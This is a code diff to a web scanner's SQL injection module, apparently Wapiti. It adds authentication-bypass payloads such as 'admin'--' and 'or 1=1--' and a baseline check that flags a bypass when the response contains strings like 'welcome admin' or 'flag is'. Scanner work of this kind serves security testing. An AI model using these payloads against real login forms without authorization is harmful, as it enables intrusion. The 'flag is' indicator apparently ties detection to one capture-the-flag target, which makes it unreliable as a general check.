@@ -330,7 +330,21 @@ class ModuleSql(Attack):
     """
     time_to_sleep = 6
     name = "sql"
-    payloads = ["[VALUE]\xBF'\"("]
+    # Authentication bypass payloads + error detection payloads
+    payloads = [
+        "[VALUE]\xBF'\"(",  # Original error detection payload
+        # Authentication bypass payloads
+        "admin'--",
+        'admin"--',
+        "admin' #",
+        'admin" #',
+        "' or '1'='1'--",
+        '" or "1"="1"--',
+        "' or 1=1--",
+        '" or 1=1--',
+        "' or 1=1#",
+        '" or 1=1#',
+    ]
     filename_payload = "'\"("  # TODO: wait for https://github.com/shazow/urllib3/pull/856 then use that for files upld
 
     def __init__(self, crawler, persister, attack_options, crawler_configuration):
@@ -424,7 +438,14 @@ class ModuleSql(Attack):
         vulnerable_parameter = False
         vulnerable_parameters = set()
 
-        for mutated_request, parameter, __ in self.mutator.mutate(
+        # Get baseline response for authentication bypass detection
+        baseline_response = None
+        try:
+            baseline_response = await self.crawler.async_send(request)
+        except RequestError:
+            pass
+
+        for mutated_request, parameter, payload_info in self.mutator.mutate(
                 request,
                 str_to_payloadinfo(self.payloads),
         ):
@@ -444,6 +465,26 @@ class ModuleSql(Attack):
                 self.network_errors += 1
             else:
                 vuln_info = find_pattern_in_response(response.content)
+
+                # Check for authentication bypass (successful login)
+                if not vuln_info and baseline_response and payload_info.payload in [
+                    "admin'--", 'admin"--', "admin' #", 'admin" #'
+                ]:
+                    # Check if response changed significantly (successful auth bypass)
+                    auth_success_indicators = ["hello admin", "flag is", "welcome admin", "admin panel"]
+                    auth_fail_indicators = ["wrong", "invalid", "incorrect", "failed"]
+
+                    response_lower = response.content.lower()
+                    baseline_lower = baseline_response.content.lower()
+
+                    # Check if we got a success indicator and baseline didn't have it
+                    has_success = any(ind in response_lower for ind in auth_success_indicators)
+                    baseline_has_success = any(ind in baseline_lower for ind in auth_success_indicators)
+                    has_fail = any(ind in response_lower for ind in auth_fail_indicators)
+
+                    if has_success and not baseline_has_success and not has_fail:
+                        vuln_info = "SQL Injection (Authentication Bypass)"
+
                 if vuln_info and not await self.is_false_positive(request):
                     # An error message implies that a vulnerability may exist
                     if parameter.is_qs_injection:
